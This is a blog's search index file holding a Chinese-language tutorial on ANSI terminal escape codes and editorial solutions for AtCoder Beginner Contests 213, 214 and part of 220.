<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ANSI Escape Code: Quick Tutorial</title>
    <url>/2022/02/18/ANSI%20Escape%20Code%20-%20Quick%20Manual/</url>
    <content><![CDATA[<p>(注：该文档主要参考/翻译了<a href="https://notes.burke.libbey.me/ansi-escape-codes/#:~:text=ANSI%20escapes%20always%20start%20with%20%5Cx1b%2C%20or%20%5Ce%2C,of%20these%20escape%20codes%20start%20with%20%5Cx1b%20%5B.">这篇博客</a>。)</p>
<p>ANSI Escape Code 是一种屏幕序列控制码，主要格式介绍如下：</p>
<span id="more"></span>

<h2 id="Control-Sequence"><a href="#Control-Sequence" class="headerlink" title="Control Sequence"></a>Control Sequence</h2><p>一个控制序列总是由 <code>&lt;ESC&gt;</code> 开头的。<code>&lt;ESC&gt;</code> 的表示方法有 <code>\x1b</code>、<code>\e</code> 和 <code>\033</code> 三种，这三种表示方法等价。控制序列的语法为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">control sequence ::= &lt;\033[&gt; + (p1;)(p2)...(pn) + &lt;a letter&gt; </span><br></pre></td></tr></table></figure>

<p>其中 <code>&lt;&gt;</code> 中的内容是必须要有的，<code>()</code> 中的内容是可以选择的。这里的 <code>&lt;a letter&gt;</code> 可以理解为一个函数的名字，而前面的若干个以 <code>;</code> 隔开的数字可以理解为函数的参数，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\033[0;1;3m</span><br></pre></td></tr></table></figure>

<p>就可以理解为函数 <code>m(0, 1, 3)</code>。如果字母之前没有参数，则函数没有参数。</p>
<h2 id="Available-Function"><a href="#Available-Function" class="headerlink" title="Available Function"></a>Available Function</h2><p>ANSI Escape Code 中可使用的常见函数如下表：</p>
<table>
<thead>
<tr>
<th></th>
<th>name</th>
<th>signature</th>
<th>description</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>Cursor Up</td>
<td>(n=1)</td>
<td>Move cursor up by <code>n</code></td>
</tr>
<tr>
<td>B</td>
<td>Cursor Down</td>
<td>(n=1)</td>
<td>Move cursor down by <code>n</code></td>
</tr>
<tr>
<td>C</td>
<td>Cursor Forward</td>
<td>(n=1)</td>
<td>Move cursor forward by <code>n</code></td>
</tr>
<tr>
<td>D</td>
<td>Cursor Back</td>
<td>(n=1)</td>
<td>Move cursor back by <code>n</code></td>
</tr>
<tr>
<td>E</td>
<td>Cursor Next Line</td>
<td>(n=1)</td>
<td>Move cursor to the beginning of the line <code>n</code> lines down</td>
</tr>
<tr>
<td>F</td>
<td>Cursor Previous Line</td>
<td>(n=1)</td>
<td>Move cursor to the beginning of the line <code>n</code> lines up</td>
</tr>
<tr>
<td>G</td>
<td>Cursor Horizontal Absolute</td>
<td>(n=1)</td>
<td>Move cursor to the the column <code>n</code> within the current row</td>
</tr>
<tr>
<td>H</td>
<td>Cursor Position</td>
<td>(n=1, m=1)</td>
<td>Move cursor to row <code>n</code>, column <code>m</code>, counting from the top left corner</td>
</tr>
<tr>
<td>J</td>
<td>Erase in Display</td>
<td>(n=0)</td>
<td>Clear part of the screen. 0, 1, 2, and 3 have various specific functions</td>
</tr>
<tr>
<td>K</td>
<td>Erase in Line</td>
<td>(n=0)</td>
<td>Clear part of the line. 0, 1, and 2 have various specific functions</td>
</tr>
<tr>
<td>S</td>
<td>Scroll Up</td>
<td>(n=1)</td>
<td>Scroll window up by <code>n</code> lines</td>
</tr>
<tr>
<td>T</td>
<td>Scroll Down</td>
<td>(n=1)</td>
<td>Scroll window down by <code>n</code> lines</td>
</tr>
<tr>
<td>s</td>
<td>Save Cursor Position</td>
<td>()</td>
<td>Save current cursor position for use with <code>u</code></td>
</tr>
<tr>
<td>u</td>
<td>Restore Cursor Position</td>
<td>()</td>
<td>Set cursor back to position last saved by <code>s</code></td>
</tr>
<tr>
<td>f</td>
<td>…</td>
<td>…</td>
<td>(same as G)</td>
</tr>
<tr>
<td>m</td>
<td>SGR</td>
<td>(*)</td>
<td>Set graphics mode. More below</td>
</tr>
</tbody></table>
<h2 id="SGR"><a href="#SGR" class="headerlink" title="SGR"></a>SGR</h2><p>SGR 函数的参数较为复杂，下表专门列举了 SGR 的各个参数的意义：</p>
<table>
<thead>
<tr>
<th>value</th>
<th>name / description</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>Reset: turn off all attributes</td>
</tr>
<tr>
<td>1</td>
<td>Bold (or bright, it’s up to the terminal and the user config to some extent)</td>
</tr>
<tr>
<td>3</td>
<td>Italic</td>
</tr>
<tr>
<td>4</td>
<td>Underline</td>
</tr>
<tr>
<td>30–37</td>
<td>Set text colour from the basic colour palette of 0–7</td>
</tr>
<tr>
<td>38;5;<em>n</em></td>
<td>Set text colour to index <code>n</code> in a <a href="https://commons.wikimedia.org/wiki/File:Xterm_256color_chart.svg">256-colour palette</a> (e.g. <code>\x1b[38;5;34m</code>)</td>
</tr>
<tr>
<td>38;2;<em>r</em>;<em>g</em>;<em>b</em></td>
<td>Set text colour to an RGB value (e.g. <code>\x1b[38;2;255;255;0m</code>)</td>
</tr>
<tr>
<td>40–47</td>
<td>Set background colour</td>
</tr>
<tr>
<td>48;5;<em>n</em></td>
<td>Set background colour to index <code>n</code> in a 256-colour palette</td>
</tr>
<tr>
<td>48;2;<em>r</em>;<em>g</em>;<em>b</em></td>
<td>Set background colour to an RGB value</td>
</tr>
<tr>
<td>90–97</td>
<td>Set text colour from the <strong>bright</strong> colour palette of 0–7</td>
</tr>
<tr>
<td>100–107</td>
<td>Set background colour from the <strong>bright</strong> colour palette of 0–7</td>
</tr>
</tbody></table>
<p>其中比较重要的用法列举如下：</p>
<ul>
<li><p>30-37 号用于设置字符的颜色，编号与颜色的对应关系为</p>
<table>
<thead>
<tr>
<th>No.</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Color</strong></td>
<td>Black</td>
<td>Red</td>
<td>Green</td>
<td>Yellow</td>
<td>Blue</td>
<td>Magenta(紫罗兰)</td>
<td>cyan(青色)</td>
<td>white</td>
</tr>
</tbody></table>
</li>
<li><p>在设置完字符颜色/背景颜色后，之后输出的字符都会是当前的颜色。如果想要关闭这个颜色设置，需要再使用一次 <code>\033[0m</code> 来清空。</p>
</li>
</ul>
<p><strong>Example</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x1b[38;2;255;255;0mH\x1b[0;1;3;35me\x1b[95ml\x1b[42ml\x1b[0;41mo\x1b[0m</span><br></pre></td></tr></table></figure>

<p>上述代码可以打印出一个每个字符颜色和背景各异的 “Hello” 字符串。</p>
<h2 id="Miscellany"><a href="#Miscellany" class="headerlink" title="Miscellany"></a>Miscellany</h2><p>另外一对有用的命令是 <code>\033[?25h</code> 和 <code>\033[?25l</code> ，用于显示和隐藏光标。此外，<code>\r</code> 和 <code>\033[1G]</code> 的作用相当：将光标移动到该行的开头。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Material</category>
      </categories>
  </entry>
  <entry>
    <title>AtCoder Beginner Contest 213 题解</title>
    <url>/2021/08/10/AtCoder%20Beginner%20Contest%20213%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-Bitwise-Exclusive-Or"><a href="#A-Bitwise-Exclusive-Or" class="headerlink" title="A. Bitwise Exclusive Or"></a>A. Bitwise Exclusive Or</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_a">传送门</a></li>
<li>给定整数 $A$ 和 $B$，求满足 $A\space xor\space C=B$ 的整数 $C$。</li>
<li>$1\leq A,B\leq 255$​。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>直接输出 $C=A\space xor\space B$ 即可。</p>
<h2 id="B-Booby-Prize"><a href="#B-Booby-Prize" class="headerlink" title="B. Booby Prize"></a>B. Booby Prize</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_b">传送门</a></li>
<li>给定 $n$ 个整数，若一个数比另一个数小，则其排名比另一个数靠前。求排名倒数第二的数的位置。</li>
<li>$n\leq 10^5$，$n$ 个数两两不同。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>求序列中第二大的数即可。时间复杂度 $O(n)$。</p>
<h2 id="C-Reorder-Cards"><a href="#C-Reorder-Cards" class="headerlink" title="C. Reorder Cards"></a>C. Reorder Cards</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_c">传送门</a></li>
<li>给定一个 $H\times W$ 的矩阵，每个格子里有一张卡片，其中有 $n$​ 张卡片上有数字，其他的卡片是空白的。每次操作可以选择一行或一列全白的卡片删除，然后将删除的行/列的下/右侧的卡片向上/左移动。重复操作直至无法操作。问每张有数字的卡片最后的位置。可以证明答案与操作的顺序无关。</li>
<li>$1\leq H,W\leq 10^9,1\leq n\leq min(10^5,HW)$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>对横坐标和纵坐标分别离散化之后得到的即为答案。总时间复杂度 $O(nlogn)$。</p>
<h2 id="D-Takahashi-Tour"><a href="#D-Takahashi-Tour" class="headerlink" title="D. Takahashi Tour"></a>D. Takahashi Tour</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_d">传送门</a></li>
<li>给定一棵 $n$ 个节点的树，从 $1$ 号点出发，如果孩子中有未访问的则访问编号最小的，否则返回父亲。求访问路径。</li>
<li>$n\leq 10^5$。</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>将每个点的孩子按照编号排序后做一遍深度优先搜索即可。时间复杂度 $O(nlogn)$，可以做到 $O(n)$ 。</p>
<h2 id="E-Stronger-Takahashi"><a href="#E-Stronger-Takahashi" class="headerlink" title="E. Stronger Takahashi"></a>E. Stronger Takahashi</h2><h3 id="题面描述-4"><a href="#题面描述-4" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_e">传送门</a></li>
<li>给定一张 $H\times W$ 的地图，每个点给定 <code>.</code> 或 <code>#</code>，表示这个点无/有障碍物。要求从 $(1,1)$ 出发前往 $(H,W)$。主人公有特殊技能，他可以选择任意一个 $2\times 2$ 的区域，将这个区域内的所有障碍物清除，这需要花费他 $1$ 的体力，行走不需要耗费体力。求到达目的地所需的最小体力。</li>
<li>$H,W\leq 500$。</li>
</ul>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>将原地图转化成一张图。对于相邻的格子，如果目标格子是空地，则建一条权值为0的边，否则不建。接下来考虑特殊技能，我们容易发现主人公一定可以只在和自己相邻的区域使用这个技能，另外使用过一次技能之后，这个 $2\times 2$​ 的区域只会经过一次，所以我们也不需要记录哪些障碍物被打通了，我们只需要对于每个格子，给其相邻的所有 $2\times 2$ 区域内的障碍物建权值为1的边即可。最后在这张图上跑一个 $01$ bfs 即可。总时间复杂度 $O(n^2)$。</p>
<p>（ $01$ bfs 的写法是：准备一个双端队列，每次从队头出队一个点，然后考虑其邻边，将权值为 $0$ 的边连接的点加入队头，将权值为 $1$ 的边连接的点加到队尾。）</p>
<h2 id="F-Common-Prefixes"><a href="#F-Common-Prefixes" class="headerlink" title="F. Common Prefixes"></a>F. Common Prefixes</h2><h3 id="题面描述-5"><a href="#题面描述-5" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_f">传送门</a></li>
<li>给定一个长度为 $n$ 的字符串 $S$ ，令 $f(x,y)$ 表示从第 $x$ 个字符开始的后缀与从第 $y$​ 个字符开始的后缀的最长公共前缀的长度。对于每个 $k=1,2,…,n$，求 $F(k)=\sum_{i=1}^nf(k,i)$。</li>
<li>$n\leq 10^6$。</li>
</ul>
<h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>对原串建立后缀数组和高度数组，这样对于每个位置 $k$​​ ，设其在后缀数组中的位置为 $sa_k$​​ ，则 $F(k)=\sum_{i=1}^n\min_{j=i}^{sa_k}height[j]$​​。</p>
<p>考虑后缀数组中某一个位置与其前面所有位置的 $lcp$ ，容易发现越远的地方 $lcp$​​ 越短，可以用一个单调栈来维护。所以我们对着高度数组正着反着分别用单调栈维护一次即可。</p>
<p>总时间复杂度 $O(nlogn)$。</p>
<h2 id="G-Connectivity-2"><a href="#G-Connectivity-2" class="headerlink" title="G. Connectivity 2"></a>G. Connectivity 2</h2><h3 id="题面描述-6"><a href="#题面描述-6" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_g">传送门</a></li>
<li>给定一张 $n$ 个点 $m$ 条边的无向图，对于每个 $k=2,3,…,n$，求满足 $1$ 号点与 $k$ 号点连通的生成子图的个数对 $998244353$ 取模的值。</li>
<li>$n\leq 17$。</li>
</ul>
<h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>我们枚举和 $1$ 号点所在的连通块 $Mask$，并计算包含 $Mask$ 的连通块的个数。令 $cnt[Mask]$ 表示两个顶点均在 $Mask$ 中的边的数量。那么对于剩下的 $m-Mask$ 条边，如果其两个顶点均不在 $Mask$ 中，则可选可不选，如果一个顶点在 $Mask$ 中另一个不在 $Mask$ 中，则不能选，否则连通块就不是 $Mask$ 了。对于 $Mask$ 的导出子图，我们设法计算其连通生成子图的个数。</p>
<p>令 $dp[Mask]$​ 表示 $Mask$​ 的导出子图的连通生成子图的个数，考虑问题的反面，用所有生成子图的个数减去不连通的生成子图的个数。欲计算不连通的生成子图的个数，我们枚举 $1$​ 号点所在的连通块 $Mask’$​ ，$Mask’\subset Mask$​。考虑 $Mask’$​ 的导出子图以外的边，和 $Mask’$​ 有关的边不能选，和 $Mask’$​ 无关的边可选可不选，因此可以得出状态转移方程：<br>$$<br>dp[Mask]=\sum_{Mask’\subset Mask}dp[Mask’]*2^{cnt[Mask-Mask’]}<br>$$ 总时间复杂度 $O(3^n+2^nm)$。</p>
<h2 id="H-Stroll"><a href="#H-Stroll" class="headerlink" title="H. Stroll"></a>H. Stroll</h2><h3 id="题面描述-7"><a href="#题面描述-7" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc213/tasks/abc213_h">传送门</a></li>
<li>给定一个 $n$ 个点的图，有 $m$ 种边，第 $i$ 种边连接 $a_i$ 和 $b_i$ ，且长度为 $j$ 的边有 $p_{i,j}$ 条。求从 $1$ 号点回到 $1$ 号点且总长度为 $T$ 的路径个数。（路径中途可以任意重复经过点和边）</li>
<li>$n\leq 10,m\leq min(10,\frac{n(n-1)}{2})，T\leq 4\times 10^4$。</li>
</ul>
<h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>令 $dp[u][i]$​​​​ 表示从 $1$​​​​ 号点出发，当前在 $u$​​​​ 号点，总长度为 $i$​​​​ 的路径的条数。显然有转移方程：<br>$$<br>dp[u][i]=\sum_{(a_j,b_j)\in E,a_j/b_j=u}\sum_{t=1}^idp[v][t]*p_{j,i-t}<br>$$注意到该dp是卷积形式，可以用分治 NTT 优化，总时间复杂度 $O(mTlog^2T)$。</p>
]]></content>
      <tags>
        <tag>AtCoder</tag>
        <tag>动态规划</tag>
        <tag>后缀数组</tag>
        <tag>单调栈/单调队列</tag>
        <tag>分治</tag>
        <tag>FFT/NTT</tag>
      </tags>
  </entry>
  <entry>
    <title>AtCoder Beginner Contest 214 题解</title>
    <url>/2021/08/17/AtCoder%20Beginner%20Contest%20214%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-New-Generation-ABC"><a href="#A-New-Generation-ABC" class="headerlink" title="A. New Generation ABC"></a>A. New Generation ABC</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc214/tasks/abc214_a">传送门</a></li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>按照题目要求判断即可。</p>
<h2 id="B-How-Many"><a href="#B-How-Many" class="headerlink" title="B. How Many?"></a>B. How Many?</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc214/tasks/abc214_b">传送门</a></li>
<li>给定 $S$ 和 $T$ ，求有多少个由非负整数构成的三元组 $(a,b,c)$ 满足 $a+b+c\leq S$ 且 $a\times b\times c\leq T$。</li>
<li>$S\leq 100, T\leq 10000$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>由于 $S$ 不大，所以直接三重循环枚举所有可能的三元组即可。复杂度 $O(S^3)$。</p>
<h2 id="C-Distribution"><a href="#C-Distribution" class="headerlink" title="C. Distribution"></a>C. Distribution</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc214/tasks/abc214_c">传送门</a></li>
<li>有 $n$ 个人围成一圈，每个人会在 $t_i$ 时刻获得一枚钻石（无来源）。如果第 $i$ 个人在 $t$ 时刻拿到了一个钻石（无来源或来自前一个人），他会在 $t+S_i$​ 时刻把钻石给下一个人。设每个人拿到第一个钻石的时间为 $T_i$ ，求 $\max_{i=1}^nT_i$​。</li>
<li>$n\leq 2\times 10^5$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>首先考虑这 $n$ 个人中 $t_i$ 最小的那个，他第一个拿到的钻石一定是无来源钻石而不是从前一个人手里传过来的钻石。我们以这个人为起点剖环为链。于是显然有 $T_i=min{T_{i-1}+S_{i-1},t_i}$，递推一遍即可。</p>
<p>总时间复杂度 $O(n)$​。</p>
<h2 id="D-Sum-of-Maximum-Weights"><a href="#D-Sum-of-Maximum-Weights" class="headerlink" title="D. Sum of Maximum Weights"></a>D. Sum of Maximum Weights</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><p><a href="https://atcoder.jp/contests/abc214/tasks/abc214_c">传送门</a></p>
</li>
<li><p>给定一棵 $n$ 个点的树和每条边的边权。令 $f(i,j)$ 表示从节点 $i$ 到节点 $j$​ 的最短路径上的最长边的权值，求<br>  $$<br>  \sum_{i=1}^{n-1}\sum_{j=i+1}^nf(i,j)<br>  $$</p>
</li>
<li><p>$n\leq 10^5$。</p>
</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>考虑每条边对答案的贡献，容易发现如果我们将所有边按边权大小从小到大排序后按顺序插入，则一条边的贡献相当于它连接的两个连通块的大小之积。因此用并查集维护连通块大小即可。</p>
<p>总时间复杂度 $O(n\alpha(n))$。</p>
<h2 id="E-Packing-Under-Range-Regulations"><a href="#E-Packing-Under-Range-Regulations" class="headerlink" title="E. Packing Under Range Regulations"></a>E. Packing Under Range Regulations</h2><h3 id="题面描述-4"><a href="#题面描述-4" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc214/tasks/abc214_e">传送门</a></li>
<li>有 $10^9$ 个箱子和 $n$ 个球，球编号 $1,2,…,n$。现给出 $n$ 个区间，第 $i$ 个区间为 $[L_i,R_i]$，问是否存在一种将球放进箱子的方案，使得每个箱子至多放一个球，且第 $i$ 个球在第 $L_i$ 到第 $R_i$ 的箱子中的某一个里。</li>
<li>$n\leq 2\times 10^5$。</li>
</ul>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>考虑一种贪心策略：如果我们一个箱子一个箱子地决策里面该放哪个球，假设现在考虑到第 $i$ 个箱子，有若干个区间可以用这个箱子来满足条件且还没有满足条件，那么我一定会选择 $R$ 最小的那个率先满足。</p>
<p>基于这种贪心策略，我们将所有的 $L$ 和 $R$ 离散化之后按顺序枚举每个端点并用一个堆动态维护当前有哪些区间还没满足条件，如果遇到一个区间的左端点就入堆，每个时刻挑堆中最小的元素出堆，如果在某一时刻出堆区间的右端点小于当前时刻则无解。</p>
<p>总时间复杂度 $O(nlogn)$。</p>
<h2 id="F-Substrings"><a href="#F-Substrings" class="headerlink" title="F. Substrings"></a>F. Substrings</h2><h3 id="题面描述-5"><a href="#题面描述-5" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><p><a href="https://atcoder.jp/contests/abc214/tasks/abc214_f">传送门</a></p>
</li>
<li><p>给定一个仅有小写字母构成的字符串 $S$，现要从 $S$ 中生成出子串 $T$，生成规则是挑选 $S$ 中不相邻的若干位按顺序连接组成 $T$，问可以组成多少种不同的 $T$。</p>
</li>
<li><p>$\mid S\mid \leq 2\times 10^5$。</p>
</li>
</ul>
<h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>令 $dp[i]$ 表示以 $i$ 结尾有多少种不同的子串，考虑如何用 $dp[i]$​ 去更新后面的答案。比如下一个接字母 <code>a</code>，那么只向最近的一个 <code>a</code> 转移。这样转移相当于所有可能的子串都只计算了字典序（字典序指所有字母出现的位置连起来构成的序列的字典序）最小的那一个，从而避免了重复计数。</p>
<p>由于字符集只有小写字母，所以每个状态最多转移 $26$ 次，总时间复杂度 $O(\mid S\mid)$。</p>
<h2 id="G-Three-Permutations"><a href="#G-Three-Permutations" class="headerlink" title="G. Three Permutations"></a>G. Three Permutations</h2><h3 id="题面描述-6"><a href="#题面描述-6" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc214/tasks/abc214_g">传送门</a></li>
<li>给定两个长度为 $n$ 的排列 $p_1,p_2,…,p_n$ 和 $q_1,q_2,…,q_n$，对于一个排列 $r_1,r_2,…,r_n$，如果对于任意 $1\leq i\leq n$​ 都有  $r_i\neq p_i$ 且 $r_i\neq q_i$ ，则称这个排列是好的。问有多少个好的排列。</li>
<li>$n\leq 3000$。</li>
</ul>
<h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>考虑容斥，转而对于所有的 $1\leq k\leq n$​ 计算有指定的 $k$ 个位置不满足条件的方案数。</p>
<p>我们容易发现两个排列构成了若干个置换，置换之间两两不影响。如果我们已经能够设法维护 $cnt[i][j]$​ 表示第 $i$​ 个置换中有 $j$​​ 个位置不合法的方案数，那么我们就可以用一个简单的背包dp来计算整个局面下有 $1,2,…,n$​ 个位置不合法的方案数。这里的背包dp只需要使用暴力转移就好，这样看上去虽然是 $O(n^3)$ 的，但由于所有置换的大小的和是 $n$ ，所以实际上是 $O(n^2)$。现在重点考虑如何计算 $cnt[i][j]$。</p>
<p>一个 $n$ 个元素的置换可以看作一个 $n$ 个点构成的圈。在置换中选出若干个位置等价于在圈中选出若干条边。我们容易发现，如果 $n$ 条边全部被选中，则有 $2$ 种放置的方案；否则选中的部分一定是若干条链，对于有 $i$ 条边的链有 $i+1$ 种放置的方案。我们容易想到动态规划，用 $f[i][j]$ 表示当前已经考虑到第 $i$ 条边，已经选了 $j$ 条边的方案数，但由于需要枚举当前这条链的长度来转移，因此复杂度为 $O(n^3)$，需要优化。</p>
<p>一个常用的技巧是：<strong>如果对于每个连通块要计算某种和其大小有关的函数，可以考虑其组合意义。</strong>在本题中对于长度为 $i$​ 的链贡献是 $i+1$​ ，我们可以考虑如下问题：在圈中选出若干条链，对于每条链，第一条边上有两个小球，其他边上有一个小球，这样长度为 $i$​ 的边上有 $i+1$​ 个小球，在其中挑选一个染色，问选边+染色的方案数。这个问题和原问题的答案是一致的。于是我们修改状态，令 $f[i][j][0/1/2]$​ 表示当前考虑到第 $i$​ 条边，已经选了 $j$​​ 条边，最后一维的三个状态分别表示 “当前边没有选” “当前边选了且当前边所在的链中还没有小球被染色” “当前边选了且当前边所在的链中已经有小球被染色”，转移是容易的。本题中由于做的是环上的问题，因此还要考虑末尾和开头的拼接问题，在实际 dp 的过程中还要多一维状态记录开头的情况，做完 dp 后将首尾状态合并再计算答案。</p>
<p>综上，我们需要做两个 $O(n^2)$ 的动态规划，再用容斥原理计算答案，总时间复杂度 $O(n^2)$。</p>
<h2 id="H-Collecting"><a href="#H-Collecting" class="headerlink" title="H. Collecting"></a>H. Collecting</h2><h3 id="题面描述-7"><a href="#题面描述-7" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc214/tasks/abc214_h">传送门</a></li>
<li>给定一张 $n$ 个点 $m$ 条边的有向图，第 $i$ 个点上有 $X_i$ 个宝石。现有 $k$ 个人，他们依次从 $1$ 号点出发，沿着有向图的边走任意步，沿途如果某个节点有宝石就将其取走。问他们最多能拿走多少宝石。</li>
<li>$n,m\leq 2\times 10^5$，$k\leq 10$。</li>
</ul>
<h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>显然同一个强连通分量里的宝石是可以一次性拿完的。如果我们将强连通分量缩点后重新建图，得到的就是一个DAG（有向无环图）。</p>
<p><strong>本题的 $k$​ 较小，这是在 $n$​​ 较大的情况下仍可以尝试考虑网络流的依据。</strong>我们先考虑如下费用流模型：对于每个点建立入点和出点 $in_u$​ 和 $out_u$​。此外建立超级源点和超级汇点，建边方法如下：</p>
<ul>
<li>在 $in_u$​​ 和 $out_u$ 之间建一条流量为 $1$ ，费用为 $-X_u$ 的边和一条流量为 $\infty$，费用为 $0$ 的边，来模拟每个点的宝石只会被取走一次。</li>
<li>对于DAG中的每条边 $(u,v)$，在 $out_u$ 和 $in_v$ 之间连一条流量为 $\infty$，费用为 $0$ 的边。</li>
<li>超级源点向 $in_1$ 连一条流量为 $k$ ，费用为 $0$ 的边。</li>
<li>所有的 $out_u$ 向超级汇点连一条流量为 $\infty$，费用为 $0$ 的边。</li>
</ul>
<p>在这张图上跑费用流，取最小费用的相反数即可得到答案。但带有负权的费用流不好做，我们可以用先强制满流再退流的方法使费用变为正数，事实上，换一个角度建图也可以规避负费用的问题。我们令每单位 “水流” 的代价为它没有吃到的宝石的代价之和，那么最小化这个代价就是最大化吃到的宝石。建边如下：</p>
<ul>
<li>在 $in_u$ 和 $out_u$ 之间建一条流量为 $1$ ，费用为 $0$ 的边和一条流量为 $\infty$ ，费用为 $X_u$ 的边。</li>
<li>对于 DAG 中的每条边 $(u,v)$，由于是 DAG 所以可以保证 $u&lt;v$，在 $out_u$ 和 $in_v$ 之间连一条流量为 $\infty$​ ，费用为 $X_{u+1}+X_{u+2}+…+X_{v-1}$ 的边，表示如果沿着这条边走就放弃了中间这些点的宝石。</li>
<li>超级源点向 $in_1$ 连一条流量为 $k$，费用为 $0$ 的边。</li>
<li>所有的 $out_u$ 向超级汇点连一条流量为 $\infty$，费用为 $X_{u+1}+X_{u+2}+…+X_n$ 的边。</li>
</ul>
<p>设该图中得到的最小费用为 $mincost$ ，则最终答案为 $k(\sum_{i=1}^nX_i)-mincost$。注意在 DAG 中 $1$ 号点之前的点理应先从 DAG 中剔除。</p>
<p>虽然本题中 $n$ 较大，但我们可以这样估算 Edmonds-Karp-Dijkstra 算法的时间复杂度：每做一次 Dijkstra 的时间复杂度为 $O(mlogm)$，每做一次最短路至少可以流一单位流量，因此复杂度的上界为 $O(kmlogm)$，可以通过。</p>
]]></content>
      <tags>
        <tag>AtCoder</tag>
        <tag>动态规划</tag>
        <tag>并查集</tag>
        <tag>容斥原理</tag>
        <tag>强连通分量</tag>
        <tag>网络流</tag>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>AtCoder Beginner Contest 220 题解</title>
    <url>/2021/10/02/AtCoder%20Beginner%20Contest%20220%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-Find-Multiple"><a href="#A-Find-Multiple" class="headerlink" title="A. Find Multiple"></a>A. Find Multiple</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_a">传送门</a></li>
<li>给定 $A,B,C$，在 $[A,B]$ 中寻找 $C$ 的倍数。</li>
<li>$1\leq A,B,C\leq 1000$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>从书写代码简便的角度而言，直接枚举 $[A,B]$ 之间的所有数即可。当然也可以数学计算。</p>
<h2 id="B-Base-K"><a href="#B-Base-K" class="headerlink" title="B. Base K"></a>B. Base K</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_b">传送门</a></li>
<li>给定 $K$ 进制下的整数 $A,B$，求 $A\times B$ 在 10 进制下的结果。</li>
<li>$1\leq A,B\leq 10^5,2\leq K\leq 10$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>将 $A,B$ 转换成十进制后相乘即可。转换进制可以使用逐位按权展开。</p>
